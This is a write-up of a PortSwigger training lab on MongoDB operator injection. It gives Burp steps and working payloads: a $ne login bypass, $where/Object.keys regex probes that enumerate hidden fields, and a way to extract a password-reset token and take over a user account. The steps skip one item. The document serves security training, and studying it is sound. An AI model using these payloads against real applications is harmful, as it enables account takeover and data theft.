# Lab: Exploiting NoSQL operator injection to extract unknown fields

**Official PortSwigger URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

**Lab idea:** The MongoDB-backed user lookup is vulnerable to NoSQL injection. The challenge involves discovering previously unknown user-data fields and recovering a password-reset token needed to access Carlos's account. It practices reasoning about semi-structured records and query behavior when field names are not known in advance.

## Vulnerability in brief
NoSQL injection is a vulnerability in which untrusted input interferes with the queries an application sends to a NoSQL database. Unlike SQL databases, NoSQL systems do not share one query language or data model, so the exact syntax and behavior vary by database. PortSwigger's topic focuses on general testing concepts and MongoDB examples. [Official topic](https://portswigger.net/web-security/nosql-injection)

## Solution idea
1. In Burp's browser, attempt to log in to the application with username carlos and password invalid .
2. In Burp, go to Proxy > HTTP history .
3. In Repeater, change the value of the password parameter from "invalid" to {"$ne":"invalid"} , then send the request.
4. In Burp's browser, attempt to reset the password for the carlos account.
- …
6. In Repeater, submit the value of the password reset token in the URL of the GET / forgot-password request: GET /forgot-password?YOURTOKENNAME=TOKENVALUE .
7. Right-click the response and select Request in browser > Original session .
8. Change Carlos's password, then log in as carlos to solve the lab.

## Payloads / key values
- `carlos`
- `invalid`
- `Invalid username or password`
- `POST /login`
- `"invalid"`
- `{"$ne":"invalid"}`
- `Account locked`
- `$ne`
- `"$where": "0"`
- `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
- `"$where": "0" to "$where": "1"`
- `$where`
- `"$where":"Object.keys(this)[1].match('^.{}.*')"`
- `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`
- `1`
- `2`
- `a-z`
- `A-Z`
- `0-9`
- `username`
- `"$where":"Object.keys(this) [2] .match('^.{}.*')"`
- `GET /forgot-password`
- `GET /forgot-password?foo=invalid`
- `GET /forgot-password?YOURTOKENNAME=invalid`
- `Invalid token`
- `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`
- `YOURTOKENNAME`
- `GET / forgot-password`
- `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`

## Official source
- [PortSwigger Academy: Lab: Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)
